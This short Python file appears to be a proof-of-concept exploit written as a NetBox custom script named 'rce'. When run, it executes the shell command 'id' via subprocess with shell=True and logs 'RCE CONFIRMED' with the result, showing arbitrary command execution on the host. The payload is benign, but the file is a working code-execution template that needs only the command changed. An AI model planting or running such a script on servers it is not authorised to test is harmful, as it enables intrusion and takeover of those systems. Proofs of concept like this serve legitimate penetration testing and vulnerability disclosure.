from extras.scripts import Script
import os
class RCE(Script):
    class Meta:
        name = "rce"
    def run(self, data, commit):
        import subprocess
        whoami = subprocess.check_output('id', shell=True).decode()
        self.log_warning(f"RCE CONFIRMED: {whoami}")
